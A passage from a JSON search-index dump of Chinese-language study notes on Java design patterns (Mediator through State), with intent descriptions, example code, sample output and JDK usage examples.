System.out.println(\u0026#34;doAlarm()\u0026#34;); } } public class CoffeePot extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;coffeePot\u0026#34;); } public void doCoffeePot() { System.out.println(\u0026#34;doCoffeePot()\u0026#34;); } } public class Calender extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;calender\u0026#34;); } public void doCalender() { System.out.println(\u0026#34;doCalender()\u0026#34;); } } public class Sprinkler extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;sprinkler\u0026#34;); } public void doSprinkler() { System.out.println(\u0026#34;doSprinkler()\u0026#34;); } } public abstract class Mediator { public abstract void doEvent(String eventType); } public class ConcreteMediator extends Mediator { private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) { this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; } @Override public void doEvent(String eventType) { switch (eventType) { case \u0026#34;alarm\u0026#34;: doAlarmEvent(); break; case \u0026#34;coffeePot\u0026#34;: doCoffeePotEvent(); break; case \u0026#34;calender\u0026#34;: doCalenderEvent(); break; default: doSprinklerEvent(); } } public void doAlarmEvent() { alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); } public void doCoffeePotEvent() { // ...  } public void doCalenderEvent() { // ...  } public void doSprinklerEvent() { // ...  } } public class Client { public static void main(String[] args) { Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // 闹钟事件到达，调用中介者就可以操作相关对象  alarm.onEvent(mediator); } } doAlarm() doCoffeePot() doCalender() doSprinkler() JDK     All scheduleXXX() methods of java.util.Timer java.util.concurrent.Executor#execute() submit() and invokeXXX() methods of java.util.concurrent.ExecutorService scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService java.lang.reflect.Method#invoke()  "},{"id":377,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BA%AB%E5%85%83/","title":"设计模式 - 享元","parent":"设计模式","content":"享元（Flyweight）    Intent    利用共享的方式来支持大量细粒度的对象，这些对象一部分内部状态是相同的。\nClass Diagram     Flyweight：享元对象 IntrinsicState：内部状态，享元对象共享内部状态 ExtrinsicState：外部状态，每个享元对象的外部状态不同  \nImplementation    public interface Flyweight { void doOperation(String extrinsicState); } public class ConcreteFlyweight implements Flyweight { private String intrinsicState; public ConcreteFlyweight(String intrinsicState) { this.intrinsicState = intrinsicState; } @Override public void doOperation(String extrinsicState) { System.out.println(\u0026#34;Object address: \u0026#34; + System.identityHashCode(this)); System.out.println(\u0026#34;IntrinsicState: \u0026#34; + intrinsicState); System.out.println(\u0026#34;ExtrinsicState: \u0026#34; + extrinsicState); } } public class FlyweightFactory { private HashMap\u0026lt;String, Flyweight\u0026gt; flyweights = new HashMap\u0026lt;\u0026gt;(); Flyweight getFlyweight(String intrinsicState) { if (!flyweights.containsKey(intrinsicState)) { Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); } return flyweights.get(intrinsicState); } } public class Client { public static void main(String[] args) { FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight(\u0026#34;aa\u0026#34;); Flyweight flyweight2 = factory.getFlyweight(\u0026#34;aa\u0026#34;); flyweight1.doOperation(\u0026#34;x\u0026#34;); flyweight2.doOperation(\u0026#34;y\u0026#34;); } } Object address: 1163157884 IntrinsicState: aa ExtrinsicState: x Object address: 1163157884 IntrinsicState: aa ExtrinsicState: y JDK    Java 利用缓存来加速大量小对象的访问时间。\n java.lang.Integer#valueOf(int) java.lang.Boolean#valueOf(boolean) java.lang.Byte#valueOf(byte) java.lang.Character#valueOf(char)  "},{"id":378,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BB%A3%E7%90%86/","title":"设计模式 - 代理","parent":"设计模式","content":"代理（Proxy）    Intent    控制对其它对象的访问。\nClass Diagram    代理有以下四类：\n 远程代理（Remote Proxy）：控制对远程对象（不同地址空间）的访问，它负责将请求及其参数进行编码，并向不同地址空间中的对象发送已经编码的请求。 虚拟代理（Virtual Proxy）：根据需要创建开销很大的对象，它可以缓存实体的附加信息，以便延迟对它的访问，例如在网站加载一个很大图片时，不能马上完成，可以用虚拟代理缓存图片的大小信息，然后生成一张临时图片代替原始图片。 保护代理（Protection Proxy）：按权限控制对象的访问，它负责检查调用者是否具有实现一个请求所必须的访问权限。 智能代理（Smart Reference）：取代了简单的指针，它在访问对象时执行一些附加操作：记录对象的引用次数；当第一次引用一个对象时，将它装入内存；在访问一个实际对象前，检查是否已经锁定了它，以确保其它对象不能改变它。  \nImplementation    以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。\npublic interface Image { void showImage(); } public class HighResolutionImage implements Image { private URL imageURL; private long startTime; private int height; private int width; public int getHeight() { return height; } public int getWidth() { return width; } public HighResolutionImage(URL imageURL) { this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; } public boolean isLoad() { // 模拟图片加载，延迟 3s 加载完成  long endTime = System.currentTimeMillis(); return endTime - startTime \u0026gt; 3000; } @Override public void showImage() { System.out.println(\u0026#34;Real Image: \u0026#34; + imageURL); } } public class ImageProxy implements Image { private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) { this.highResolutionImage = highResolutionImage; } @Override public void showImage() { while (!highResolutionImage.isLoad()) { try { System.out.println(\u0026#34;Temp Image: \u0026#34; + highResolutionImage.getWidth() + \u0026#34; \u0026#34; + highResolutionImage.getHeight()); Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } highResolutionImage.showImage(); } } public class ImageViewer { public static void main(String[] args) throws Exception { String image = \u0026#34;http://image.jpg\u0026#34;; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); } } JDK     java.lang.reflect.Proxy RMI  "},{"id":379,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B/","title":"设计模式 - 单例","parent":"设计模式","content":"单例（Singleton）    Intent    确保一个类只有一个实例，并提供该实例的全局访问点。\nClass Diagram    使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。\n私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。\n\nImplementation    Ⅰ 懒汉式-线程不安全    以下实现中，私有静态变量 uniqueInstance 被延迟实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。\n这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 if (uniqueInstance == null) ，并且此时 uniqueInstance 为 null，那么会有多个线程执行 uniqueInstance = new Singleton(); 语句，这将导致实例化多次 uniqueInstance。\npublic class Singleton { private static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance; } } Ⅱ 饿汉式-线程安全    线程不安全问题主要是由于 uniqueInstance 被实例化多次，采取直接实例化 uniqueInstance 的方式就不会产生线程不安全问题。\n但是直接实例化的方式也丢失了延迟实例化带来的节约资源的好处。\nprivate static Singleton uniqueInstance = new Singleton(); Ⅲ 懒汉式-线程安全    只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了实例化多次 uniqueInstance。\n但是当一个线程进入该方法之后，其它试图进入该方法的线程都必须等待，即使 uniqueInstance 已经被实例化了。这会让线程阻塞时间过长，因此该方法有性能问题，不推荐使用。\npublic static synchronized Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance; } Ⅳ 双重校验锁-线程安全    uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。\n双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。\npublic class Singleton { private volatile static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { synchronized (Singleton.class) { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } } } return uniqueInstance; } } 考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程都执行了 if 语句，那么两个线程都会进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 uniqueInstance = new Singleton(); 这条语句，只是先后的问题，那么就会进行两次实例化。因此必须使用双重校验锁，也就是需要使用两个 if 语句：第一个 if 语句用来避免 uniqueInstance 已经被实例化之后的加锁操作，而第二个 if 语句进行了加锁，所以只能有一个线程进入，就不会出现 uniqueInstance == null 时两个线程同时进行实例化操作。\nif (uniqueInstance == null) { synchronized (Singleton.class) { uniqueInstance = new Singleton(); } } uniqueInstance 采用 volatile 关键字修饰也是很有必要的， uniqueInstance = new Singleton(); 这段代码其实是分为三步执行：\n 为 uniqueInstance 分配内存空间 初始化 uniqueInstance 将 uniqueInstance 指向分配的内存地址  但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1\u0026gt;3\u0026gt;2。指令重排在单线程环境下不会出现问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T1 执行了 1 和 3，此时 T2 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。\n使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。\nⅤ 静态内部类实现    当 Singleton 类被加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 getUniqueInstance() 方法从而触发 SingletonHolder.INSTANCE 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。\n这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。\npublic class Singleton { private Singleton() { } private static class SingletonHolder { private static final Singleton INSTANCE = new Singleton(); } public static Singleton getUniqueInstance() { return SingletonHolder.INSTANCE; } } Ⅵ 枚举实现    public enum Singleton { INSTANCE; private String objName; public String getObjName() { return objName; } public void setObjName(String objName) { this.objName = objName; } public static void main(String[] args) { // 单例测试  Singleton firstSingleton = Singleton.INSTANCE; firstSingleton.setObjName(\u0026#34;firstName\u0026#34;); System.out.println(firstSingleton.getObjName()); Singleton secondSingleton = Singleton.INSTANCE; secondSingleton.setObjName(\u0026#34;secondName\u0026#34;); System.out.println(firstSingleton.getObjName()); System.out.println(secondSingleton.getObjName()); // 反射获取实例测试  try { Singleton[] enumConstants = Singleton.class.getEnumConstants(); for (Singleton enumConstant : enumConstants) { System.out.println(enumConstant.getObjName()); } } catch (Exception e) { e.printStackTrace(); } } } firstName secondName secondName secondName 该实现可以防止反射攻击。在其它实现中，通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象，如果要防止这种攻击，需要在构造函数中添加防止多次实例化的代码。该实现是由 JVM 保证只会实例化一次，因此不会出现上述的反射攻击。\n该实现在多次序列化和序列化之后，不会得到多个实例。而其它实现需要使用 transient 修饰所有字段，并且实现序列化和反序列化的方法。\nExamples     Logger Classes Configuration Classes Accesing resources in shared mode Factories implemented as Singletons  JDK     java.lang.Runtime#getRuntime() java.awt.Desktop#getDesktop() java.lang.System#getSecurityManager()  "},{"id":380,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"设计模式 - 原型模式","parent":"设计模式","content":"6. 原型模式（Prototype）    Intent    使用原型实例指定要创建对象的类型，通过复制这个原型来创建新对象。\nClass Diagram    \nImplementation    public abstract class Prototype { abstract Prototype myClone(); } public class ConcretePrototype extends Prototype { private String filed; public ConcretePrototype(String filed) { this.filed = filed; } @Override Prototype myClone() { return new ConcretePrototype(filed); } @Override public String toString() { return filed; } } public class Client { public static void main(String[] args) { Prototype prototype = new ConcretePrototype(\u0026#34;abc\u0026#34;); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); } } abc JDK     java.lang.Object#clone()  "},{"id":381,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%91%BD%E4%BB%A4/","title":"设计模式 - 命令","parent":"设计模式","content":"2. 命令（Command）    Intent    将命令封装成对象中，具有以下作用：\n 使用命令来参数化其它对象 将命令放入队列中进行排队 将命令的操作记录到日志中 支持可撤销的操作  Class Diagram     Command：命令 Receiver：命令接收者，也就是命令真正的执行者 Invoker：通过它来调用命令 Client：可以设置命令与命令的接收者  \nImplementation    设计一个遥控器，可以控制电灯开关。\n\npublic interface Command { void execute(); } public class LightOnCommand implements Command { Light light; public LightOnCommand(Light light) { this.light = light; } @Override public void execute() { light.on(); } } public class LightOffCommand implements Command { Light light; public LightOffCommand(Light light) { this.light = light; } @Override public void execute() { light.off(); } } public class Light { public void on() { System.out.println(\u0026#34;Light is on!\u0026#34;); } public void off() { System.out.println(\u0026#34;Light is off!\u0026#34;); } } /** * 遥控器 */ public class Invoker { private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() { this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; } public void setOnCommand(Command command, int slot) { onCommands[slot] = command; } public void setOffCommand(Command command, int slot) { offCommands[slot] = command; } public void onButtonWasPushed(int slot) { onCommands[slot].execute(); } public void offButtonWasPushed(int slot) { offCommands[slot].execute(); } } public class Client { public static void main(String[] args) { Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); } } JDK     java.lang.Runnable Netflix Hystrix javax.swing.Action  "},{"id":382,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%87%E5%BF%98%E5%BD%95/","title":"设计模式 - 备忘录","parent":"设计模式","content":"备忘录（Memento）    Intent    在不违反封装的情况下获得对象的内部状态，从而在需要时可以将对象恢复到最初状态。\nClass Diagram     Originator：原始对象 Caretaker：负责保存好备忘录 Memento：备忘录，存储原始对象的状态。备忘录实际上有两个接口，一个是提供给 Caretaker 的窄接口：它只能将备忘录传递给其它对象；一个是提供给 Originator 的宽接口，允许它访问到先前状态所需的所有数据。理想情况是只允许 Originator 访问本备忘录的内部状态。  \nImplementation    以下实现了一个简单计算器程序，可以输入两个值，然后计算这两个值的和。备忘录模式允许将这两个值存储起来，然后在某个时刻用存储的状态进行恢复。\n实现参考：Memento Pattern - Calculator Example - Java Sourcecode\n/** * Originator Interface */ public interface Calculator { // Create Memento  PreviousCalculationToCareTaker backupLastCalculation(); // setMemento  void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber); } /** * Originator Implementation */ public class CalculatorImp implements Calculator { private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() { // create a memento object used for restoring two numbers  return new PreviousCalculationImp(firstNumber, secondNumber); } @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) { this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); } @Override public int getCalculationResult() { // result is adding two numbers  return firstNumber + secondNumber; } @Override public void setFirstNumber(int firstNumber) { this.firstNumber = firstNumber; } @Override public void setSecondNumber(int secondNumber) { this.secondNumber = secondNumber; } } /** * Memento Interface to Originator * * This interface allows the originator to restore its state */ public interface PreviousCalculationToOriginator { int getFirstNumber(); int getSecondNumber(); } /** * Memento interface to CalculatorOperator (Caretaker) */ public interface PreviousCalculationToCareTaker { // no operations permitted for the caretaker } /** * Memento Object Implementation * \u0026lt;p\u0026gt; * Note that this object implements both interfaces to Originator and CareTaker */ public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator { private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) { this.firstNumber = firstNumber; this.secondNumber = secondNumber; } @Override public int getFirstNumber() { return firstNumber; } @Override public int getSecondNumber() { return secondNumber; } } /** * CareTaker object */ public class Client { public static void main(String[] args) { // program starts  Calculator calculator = new CalculatorImp(); // assume user enters two numbers  calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result  System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error  PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number  calculator.setFirstNumber(17); // user enters a wrong second number and calculates result  calculator.setSecondNumber(-290); // calculate result  System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result  calculator.restorePreviousCalculation(memento); // result restored  System.out.println(calculator.getCalculationResult()); } } 110 -273 110 JDK     java.io.Serializable  "},{"id":383,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%96%E8%A7%82/","title":"设计模式 - 外观","parent":"设计模式","content":"外观（Facade）    Intent    提供了一个统一的接口，用来访问子系统中的一群接口，从而让子系统更容易使用。\nClass Diagram    \nImplementation    观看电影需要操作很多电器，使用外观模式实现一键看电影功能。\npublic class SubSystem { public void turnOnTV() { System.out.println(\u0026#34;turnOnTV()\u0026#34;); } public void setCD(String cd) { System.out.println(\u0026#34;setCD( \u0026#34; + cd + \u0026#34; )\u0026#34;); } public void startWatching(){ System.out.println(\u0026#34;startWatching()\u0026#34;); } } public class Facade { private SubSystem subSystem = new SubSystem(); public void watchMovie() { subSystem.turnOnTV(); subSystem.setCD(\u0026#34;a movie\u0026#34;); subSystem.startWatching(); } } public class Client { public static void main(String[] args) { Facade facade = new Facade(); facade.watchMovie(); } } 设计原则    最少知识原则：只和你的密友谈话。也就是说客户对象所需要交互的对象应当尽可能少。\n"},{"id":384,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95/","title":"设计模式 - 工厂方法","parent":"设计模式","content":"工厂方法（Factory Method）    Intent    定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化操作推迟到子类。\nClass Diagram    在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。\n下图中，Factory 有一个 doSomething() 方法，这个方法需要用到一个产品对象，这个产品对象由 factoryMethod() 方法创建。该方法是抽象的，需要由子类去实现。\n\nImplementation    public abstract class Factory { abstract public Product factoryMethod(); public void doSomething() { Product product = factoryMethod(); // do something with the product  } } public class ConcreteFactory extends Factory { public Product factoryMethod() { return new ConcreteProduct(); } } public class ConcreteFactory1 extends Factory { public Product factoryMethod() { return new ConcreteProduct1(); } } public class ConcreteFactory2 extends Factory { public Product factoryMethod() { return new ConcreteProduct2(); } } JDK     java.util.Calendar java.util.ResourceBundle java.text.NumberFormat java.nio.charset.Charset java.net.URLStreamHandlerFactory java.util.EnumSet javax.xml.bind.JAXBContext  "},{"id":385,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82/","title":"设计模式 - 抽象工厂","parent":"设计模式","content":"4. 抽象工厂（Abstract Factory）    Intent    提供一个接口，用于创建 相关的对象家族 。\nClass Diagram    抽象工厂模式创建的是对象家族，也就是很多对象而不是一个对象，并且这些对象是相关的，也就是说必须一起创建出来。而工厂方法模式只是用于创建一个对象，这和抽象工厂模式有很大不同。\n抽象工厂模式用到了工厂方法模式来创建单一对象，AbstractFactory 中的 createProductA() 和 createProductB() 方法都是让子类来实现，这两个方法单独来看就是在创建一个对象，这符合工厂方法模式的定义。\n至于创建对象的家族这一概念是在 Client 体现，Client 要通过 AbstractFactory 同时调用两个方法来创建出两个对象，在这里这两个对象就有很大的相关性，Client 需要同时创建出这两个对象。\n从高层次来看，抽象工厂使用了组合，即 Cilent 组合了 AbstractFactory，而工厂方法模式使用了继承。\n\nImplementation    public class AbstractProductA { } public class AbstractProductB { } public class ProductA1 extends AbstractProductA { } public class ProductA2 extends AbstractProductA { } public class ProductB1 extends AbstractProductB { } public class ProductB2 extends AbstractProductB { } public abstract class AbstractFactory { abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB(); } public class ConcreteFactory1 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA1(); } AbstractProductB createProductB() { return new ProductB1(); } } public class ConcreteFactory2 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA2(); } AbstractProductB createProductB() { return new ProductB2(); } } public class Client { public static void main(String[] args) { AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB  } } JDK     javax.xml.parsers.DocumentBuilderFactory javax.xml.transform.TransformerFactory javax.xml.xpath.XPathFactory  "},{"id":386,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A1%A5%E6%8E%A5/","title":"设计模式 - 桥接","parent":"设计模式","content":"桥接（Bridge）    Intent    将抽象与实现分离开来，使它们可以独立变化。\nClass Diagram     Abstraction：定义抽象类的接口 Implementor：定义实现类接口  \nImplementation    RemoteControl 表示遥控器，指代 Abstraction。\nTV 表示电视，指代 Implementor。\n桥接模式将遥控器和电视分离开来，从而可以独立改变遥控器或者电视的实现。\npublic abstract class TV { public abstract void on(); public abstract void off(); public abstract void tuneChannel(); } public class Sony extends TV { @Override public void on() { System.out.println(\u0026#34;Sony.on()\u0026#34;); } @Override public void off() { System.out.println(\u0026#34;Sony.off()\u0026#34;); } @Override public void tuneChannel() { System.out.println(\u0026#34;Sony.tuneChannel()\u0026#34;); } } public class RCA extends TV { @Override public void on() { System.out.println(\u0026#34;RCA.on()\u0026#34;); } @Override public void off() { System.out.println(\u0026#34;RCA.off()\u0026#34;); } @Override public void tuneChannel() { System.out.println(\u0026#34;RCA.tuneChannel()\u0026#34;); } } public abstract class RemoteControl { protected TV tv; public RemoteControl(TV tv) { this.tv = tv; } public abstract void on(); public abstract void off(); public abstract void tuneChannel(); } public class ConcreteRemoteControl1 extends RemoteControl { public ConcreteRemoteControl1(TV tv) { super(tv); } @Override public void on() { System.out.println(\u0026#34;ConcreteRemoteControl1.on()\u0026#34;); tv.on(); } @Override public void off() { System.out.println(\u0026#34;ConcreteRemoteControl1.off()\u0026#34;); tv.off(); } @Override public void tuneChannel() { System.out.println(\u0026#34;ConcreteRemoteControl1.tuneChannel()\u0026#34;); tv.tuneChannel(); } } public class ConcreteRemoteControl2 extends RemoteControl { public ConcreteRemoteControl2(TV tv) { super(tv); } @Override public void on() { System.out.println(\u0026#34;ConcreteRemoteControl2.on()\u0026#34;); tv.on(); } @Override public void off() { System.out.println(\u0026#34;ConcreteRemoteControl2.off()\u0026#34;); tv.off(); } @Override public void tuneChannel() { System.out.println(\u0026#34;ConcreteRemoteControl2.tuneChannel()\u0026#34;); tv.tuneChannel(); } } public class Client { public static void main(String[] args) { RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); RemoteControl remoteControl2 = new ConcreteRemoteControl2(new Sony()); remoteControl2.on(); remoteControl2.off(); remoteControl2.tuneChannel(); } } JDK     AWT (It provides an abstraction layer which maps onto the native OS the windowing support.) JDBC  "},{"id":387,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95/","title":"设计模式 - 模板方法","parent":"设计模式","content":"模板方法（Template Method）    Intent    定义算法框架，并将一些步骤的实现延迟到子类。\n通过模板方法，子类可以重新定义算法的某些步骤，而不用改变算法的结构。\nClass Diagram    \nImplementation    冲咖啡和冲茶都有类似的流程，但是某些步骤会有点不一样，要求复用那些相同步骤的代码。\n\npublic abstract class CaffeineBeverage { final void prepareRecipe() { boilWater(); brew(); pourInCup(); addCondiments(); } abstract void brew(); abstract void addCondiments(); void boilWater() { System.out.println(\u0026#34;boilWater\u0026#34;); } void pourInCup() { System.out.println(\u0026#34;pourInCup\u0026#34;); } } public class Coffee extends CaffeineBeverage { @Override void brew() { System.out.println(\u0026#34;Coffee.brew\u0026#34;); } @Override void addCondiments() { System.out.println(\u0026#34;Coffee.addCondiments\u0026#34;); } } public class Tea extends CaffeineBeverage { @Override void brew() { System.out.println(\u0026#34;Tea.brew\u0026#34;); } @Override void addCondiments() { System.out.println(\u0026#34;Tea.addCondiments\u0026#34;); } } public class Client { public static void main(String[] args) { CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println(\u0026#34;-----------\u0026#34;); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); } } boilWater Coffee.brew pourInCup Coffee.addCondiments ----------- boilWater Tea.brew pourInCup Tea.addCondiments JDK     java.util.Collections#sort() java.io.InputStream#skip() java.io.InputStream#read() java.util.AbstractList#indexOf()  "},{"id":388,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%8A%B6%E6%80%81/","title":"设计模式 - 状态","parent":"设计模式","content":"8. 状态（State）    Intent    允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它所属的类。\nClass Diagram    \nImplementation    糖果销售机有多种状态，每种状态下销售机有不同的行为，状态可以发生转移，使得销售机的行为也发生改变。\n\npublic interface State { /** * 投入 25 分钱 */ void insertQuarter(); /** * 退回 25 分钱 */ void ejectQuarter(); /** * 转动曲柄 */ void turnCrank(); /** * 发放糖果 */ void dispense(); } public class HasQuarterState implements State { private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;You can\u0026#39;t insert another quarter\u0026#34;); } @Override public void ejectQuarter() { System.out.println(\u0026#34;Quarter returned\u0026#34;); gumballMachine.setState(gumballMachine.getNoQuarterState()); } @Override public void turnCrank() { System.out.println(\u0026#34;You turned...\u0026#34;); gumballMachine.setState(gumballMachine.getSoldState()); } @Override public void dispense() { System.out.println(\u0026#34;No gumball dispensed\u0026#34;); } } public class NoQuarterState implements State { GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;You insert a quarter\u0026#34;); gumballMachine.setState(gumballMachine.getHasQuarterState()); } @Override public void ejectQuarter() { System.out.println(\u0026#34;You haven\u0026#39;t insert a quarter\u0026#34;); } @Override public void turnCrank() { System.out.println(\u0026#34;You turned, but there\u0026#39;s no quarter\u0026#34;); } @Override public void dispense() { System.out.println(\u0026#34;You need to pay first\u0026#34;); } } public class SoldOutState implements State { GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;You can\u0026#39;t insert a quarter, the machine is sold out\u0026#34;); } @Override public void ejectQuarter() { System.out.println(\u0026#34;You can\u0026#39;t eject, you haven\u0026#39;t inserted a 